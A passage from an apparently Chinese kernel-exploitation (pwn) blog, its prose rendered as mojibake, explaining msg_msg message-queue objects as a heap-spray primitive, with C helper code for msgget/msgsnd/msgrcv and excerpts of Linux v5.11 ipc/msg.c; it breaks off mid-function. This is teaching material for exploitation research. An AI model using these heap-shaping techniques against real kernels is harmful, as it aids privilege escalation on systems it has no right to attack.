      <p>ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„æŒ‡å®šä¸€ä¸ªå½“å‰çš„expç¨‹åºï¼Œç±»ä¼¼å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²ä»»æ„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/ufdExp&quot;</span>, <span class="string">&quot;PIG-007&quot;</span>, &amp;buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>


        <h2 id="10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"   >
          <a href="#10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="headerlink" title="10.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"></a>10.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024</h2>
      <p>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorroâ€™s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</p>
<p>è™½ç„¶å†™çš„æ˜¯æœ€å¤§<code>kmalloc-1024</code>ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­<code>kmalloc(1024)</code>ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„<code>kmallo-xx</code>äº†ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-2"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-2"   >
          <a href="#â‘ åˆ›å»º-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-2" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <ul>
<li><p>é¦–å…ˆåˆ›å»º<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE</span></span><br><span class="line"><span class="comment">//ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç®€å•å°è£…çš„<code>msgget</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·<code>__NR_msgget</code>ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º</p>
</li>
</ul>

        <h4 id="â‘¡æ•°æ®ä¼ è¾“"   >
          <a href="#â‘¡æ•°æ®ä¼ è¾“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ•°æ®ä¼ è¾“" class="headerlink" title="â‘¡æ•°æ®ä¼ è¾“"></a>â‘¡æ•°æ®ä¼ è¾“</h4>
      <ul>
<li><p>å†™å…¥æ¶ˆæ¯ï¼š</p>
<p>ç„¶åå°±å¯ä»¥ä¾æ®<code>queue_id</code>å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº<code>pipe</code>å’Œ<code>socketpair</code>ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ<code>msgsnd/msgrcv</code>ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ<code>__NR_msgrcv/__NR_msgsnd</code>ï¼‰æ¥å®ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¯»å–æ¶ˆæ¯ï¼š</p>
<p>ä¹‹åå³å¯ä¾æ®<code>queue_id</code>è¯»å–æ¶ˆæ¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</p>
<ul>
<li>åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>mtype</code>ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤<code>mtype</code>æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶</li>
<li>åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>msgtyp</code>ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ<ul>
<li><code>msgtyp</code>å¤§äº0ï¼šé‚£ä¹ˆåœ¨<code>find_msg</code>å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº<code>msgtyp</code>çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚</li>
<li><code>msgtyp</code>ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ<code>find_msg</code>å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚</li>
<li><code>msgtyp</code>å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ<code>mtype</code>çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>å¯ä»¥å…³æ³¨ä¸€ä¸‹<code>MSG_NOERROR</code>æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´<code>msg_flag</code>æ²¡æœ‰è®¾ç½®<code>MSG_NOERROR</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦<code>m_ts_size</code>ä¸º<code>0x200</code>ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>ä½†æ˜¯å¦‚æœè®¾ç½®äº†<code>MSG_NOERROR</code>ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>msg_flag</code>ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>

        <h4 id="â‘¢é‡Šæ”¾"   >
          <a href="#â‘¢é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é‡Šæ”¾" class="headerlink" title="â‘¢é‡Šæ”¾"></a>â‘¢é‡Šæ”¾</h4>
      <p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°<code>msgctl</code>å°è£…å‡½æ•°æˆ–è€…<code>__NR_msgctl</code>ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„<code>msg_queue</code>çš„ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id),IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?</p>
<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>cmd</code>å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>

        <h4 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>
      <p>æ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ›å»º-3"   >
          <a href="#â‘ åˆ›å»º-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-3" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      
        <h5 id="A-å†…å­˜ç”³è¯·-1"   >
          <a href="#A-å†…å­˜ç”³è¯·-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·-1" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <ul>
<li><p>è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º<code>msg_queue</code>ç»“æ„ä½“ï¼Œä½¿ç”¨<code>msgget</code>å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„<code>newque()</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨<code>kvmalloc()</code>ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº<code>kmalloc-256</code>ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¿›è¡Œç›¸å…³æ³¨å†Œ</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	